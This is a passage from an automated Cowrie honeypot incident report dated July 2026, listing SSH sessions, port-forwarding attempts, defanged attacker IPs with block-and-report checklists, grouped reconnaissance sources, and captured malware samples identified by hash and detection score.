| **First Seen** | 2026-07-15 08:19 |
| **Last Seen** | 2026-07-15 08:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:19:34` | `cowrie.session.connect` |
| `2026-07-15 08:19:35` | `cowrie.client.version` |
| `2026-07-15 08:19:35` | `cowrie.client.kex` |
| `2026-07-15 08:19:38` | `cowrie.login.success` |
| `2026-07-15 08:19:38` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4724e6f7e409

| Field | Detail |
|---|---|
| **Source IP** | `203.129.217[.]70` |
| **First Seen** | 2026-07-15 08:22 |
| **Last Seen** | 2026-07-15 08:22 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:22:36` | `cowrie.session.connect` |
| `2026-07-15 08:22:39` | `cowrie.client.version` |
| `2026-07-15 08:22:39` | `cowrie.client.kex` |
| `2026-07-15 08:22:47` | `cowrie.login.success` |
| `2026-07-15 08:22:50` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.217[.]70` to AbuseIPDB if not already reported
- [ ] Block `203.129.217[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a06f267be30

| Field | Detail |
|---|---|
| **Source IP** | `151.237.115[.]208` |
| **First Seen** | 2026-07-15 08:22 |
| **Last Seen** | 2026-07-15 08:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:22:59` | `cowrie.session.connect` |
| `2026-07-15 08:22:59` | `cowrie.client.version` |
| `2026-07-15 08:22:59` | `cowrie.client.kex` |
| `2026-07-15 08:23:00` | `cowrie.login.success` |
| `2026-07-15 08:23:00` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.237.115[.]208` to AbuseIPDB if not already reported
- [ ] Block `151.237.115[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97a47801295

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-07-15 08:23 |
| **Last Seen** | 2026-07-15 08:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:23:09` | `cowrie.session.connect` |
| `2026-07-15 08:23:10` | `cowrie.client.version` |
| `2026-07-15 08:23:10` | `cowrie.client.kex` |
| `2026-07-15 08:23:12` | `cowrie.login.success` |
| `2026-07-15 08:23:13` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e4a79368e6

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-07-15 08:23 |
| **Last Seen** | 2026-07-15 08:28 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:23:22` | `cowrie.session.connect` |
| `2026-07-15 08:23:23` | `cowrie.client.version` |
| `2026-07-15 08:23:23` | `cowrie.client.kex` |
| `2026-07-15 08:23:24` | `cowrie.login.success` |
| `2026-07-15 08:23:25` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbed838c0325

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 08:29 |
| **Last Seen** | 2026-07-15 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:29:37` | `cowrie.session.connect` |
| `2026-07-15 08:29:37` | `cowrie.client.version` |
| `2026-07-15 08:29:37` | `cowrie.client.kex` |
| `2026-07-15 08:29:38` | `cowrie.login.success` |
| `2026-07-15 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a13e9046ccd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 08:29 |
| **Last Seen** | 2026-07-15 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:29:37` | `cowrie.session.connect` |
| `2026-07-15 08:29:37` | `cowrie.client.version` |
| `2026-07-15 08:29:37` | `cowrie.client.kex` |
| `2026-07-15 08:29:38` | `cowrie.login.success` |
| `2026-07-15 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99fdc02a6db

| Field | Detail |
|---|---|
| **Source IP** | `180.168.60[.]146` |
| **First Seen** | 2026-07-15 08:44 |
| **Last Seen** | 2026-07-15 08:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:44:43` | `cowrie.session.connect` |
| `2026-07-15 08:44:43` | `cowrie.client.version` |
| `2026-07-15 08:44:43` | `cowrie.client.kex` |
| `2026-07-15 08:44:45` | `cowrie.login.success` |
| `2026-07-15 08:44:46` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.168.60[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.168.60[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc8040a141c

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-15 08:45 |
| **Last Seen** | 2026-07-15 08:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:45:08` | `cowrie.session.connect` |
| `2026-07-15 08:45:08` | `cowrie.client.version` |
| `2026-07-15 08:45:08` | `cowrie.client.kex` |
| `2026-07-15 08:45:10` | `cowrie.login.success` |
| `2026-07-15 08:45:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be8f0ddf31b

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-07-15 08:45 |
| **Last Seen** | 2026-07-15 08:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:45:16` | `cowrie.session.connect` |
| `2026-07-15 08:45:17` | `cowrie.client.version` |
| `2026-07-15 08:45:17` | `cowrie.client.kex` |
| `2026-07-15 08:45:19` | `cowrie.login.success` |
| `2026-07-15 08:45:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8206cb95e6e7

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-07-15 08:47 |
| **Last Seen** | 2026-07-15 08:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:47:59` | `cowrie.session.connect` |
| `2026-07-15 08:47:59` | `cowrie.client.version` |
| `2026-07-15 08:47:59` | `cowrie.client.kex` |
| `2026-07-15 08:48:02` | `cowrie.login.success` |
| `2026-07-15 08:48:02` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-850749265b9a

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-15 08:48 |
| **Last Seen** | 2026-07-15 08:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:48:08` | `cowrie.session.connect` |
| `2026-07-15 08:48:08` | `cowrie.client.version` |
| `2026-07-15 08:48:08` | `cowrie.client.kex` |
| `2026-07-15 08:48:11` | `cowrie.login.success` |
| `2026-07-15 08:48:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72fcc9b211ac

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]158` |
| **First Seen** | 2026-07-15 08:48 |
| **Last Seen** | 2026-07-15 08:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:48:17` | `cowrie.session.connect` |
| `2026-07-15 08:48:18` | `cowrie.client.version` |
| `2026-07-15 08:48:18` | `cowrie.client.kex` |
| `2026-07-15 08:48:20` | `cowrie.login.success` |
| `2026-07-15 08:48:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]158` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05b206e9c18

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-15 08:48 |
| **Last Seen** | 2026-07-15 08:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:48:26` | `cowrie.session.connect` |
| `2026-07-15 08:48:27` | `cowrie.client.version` |
| `2026-07-15 08:48:27` | `cowrie.client.kex` |
| `2026-07-15 08:48:29` | `cowrie.login.success` |
| `2026-07-15 08:48:30` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198bc8fa4b05

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-15 08:51 |
| **Last Seen** | 2026-07-15 08:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:51:24` | `cowrie.session.connect` |
| `2026-07-15 08:51:25` | `cowrie.client.version` |
| `2026-07-15 08:51:25` | `cowrie.client.kex` |
| `2026-07-15 08:51:28` | `cowrie.login.success` |
| `2026-07-15 08:51:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4966752bcaeb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 08:51 |
| **Last Seen** | 2026-07-15 08:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:51:27` | `cowrie.session.connect` |
| `2026-07-15 08:51:28` | `cowrie.client.version` |
| `2026-07-15 08:51:28` | `cowrie.client.kex` |
| `2026-07-15 08:51:29` | `cowrie.login.success` |
| `2026-07-15 08:51:30` | `cowrie.session.params` |
| `2026-07-15 08:51:30` | `cowrie.command.input` |
| `2026-07-15 08:51:30` | `cowrie.log.closed` |
| `2026-07-15 08:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349c7ff048d3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 08:53 |
| **Last Seen** | 2026-07-15 08:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 08:53:01` | `cowrie.session.connect` |
| `2026-07-15 08:53:01` | `cowrie.client.version` |
| `2026-07-15 08:53:01` | `cowrie.client.kex` |
| `2026-07-15 08:53:01` | `cowrie.login.success` |
| `2026-07-15 08:53:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 08:53:02` | `cowrie.direct-tcpip.data` |
| `2026-07-15 08:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.233[.]61` | **148** | 2026-07-15 04:55 | 2026-07-15 08:48 | 97m | 0 | `T1592` | 🟠 MEDIUM |
| `34.52.206[.]162` | **30** | 2026-07-15 05:15 | 2026-07-15 05:15 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `8.217.232[.]214` | **11** | 2026-07-15 07:07 | 2026-07-15 07:20 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-15 04:56 | 2026-07-15 08:50 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `71.6.146[.]186` | **4** | 2026-07-15 07:46 | 2026-07-15 07:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]237` | **4** | 2026-07-15 07:04 | 2026-07-15 07:29 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.154[.]130` | **2** | 2026-07-15 08:37 | 2026-07-15 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-07-15 05:03 | 2026-07-15 05:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.81.47[.]186` | **2** | 2026-07-15 08:05 | 2026-07-15 08:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]251` | 1 | 2026-07-15 05:52 | 2026-07-15 05:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.29.5[.]231` | 1 | 2026-07-15 08:05 | 2026-07-15 08:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.122.79[.]54` | 1 | 2026-07-15 06:25 | 2026-07-15 06:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]233` | 1 | 2026-07-15 05:13 | 2026-07-15 05:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-07-15 07:04 | 2026-07-15 07:04 | 7s | 0 | `T1592` | 🟢 LOW |
| `183.251.230[.]98` | 1 | 2026-07-15 07:11 | 2026-07-15 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]235` | 1 | 2026-07-15 05:12 | 2026-07-15 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]205` | 1 | 2026-07-15 06:50 | 2026-07-15 06:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | 1 | 2026-07-15 06:02 | 2026-07-15 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-07-15 06:10 | 2026-07-15 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.169.212[.]206` | 1 | 2026-07-15 06:37 | 2026-07-15 06:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `212.3.155[.]8` | 1 | 2026-07-15 05:51 | 2026-07-15 05:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-15 08:25 | 2026-07-15 08:26 | 32s | 0 | `T1592` | 🟢 LOW |
| `217.146.80[.]125` | 1 | 2026-07-15 05:12 | 2026-07-15 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.189.183[.]188` | 1 | 2026-07-15 06:31 | 2026-07-15 06:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]240` | 1 | 2026-07-15 07:41 | 2026-07-15 07:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-15 07:07 | 2026-07-15 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-07-15 08:06 | 2026-07-15 08:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-15 07:04 | 2026-07-15 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-15 05:42 | 2026-07-15 05:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-07-15 07:03 | 2026-07-15 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-15 08:09 | 2026-07-15 08:09 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]80` | 1 | 2026-07-15 07:50 | 2026-07-15 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | 1 | 2026-07-15 07:54 | 2026-07-15 07:54 | 16s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-07-15 05:42 | 2026-07-15 05:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]55` | 1 | 2026-07-15 07:50 | 2026-07-15 07:50 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
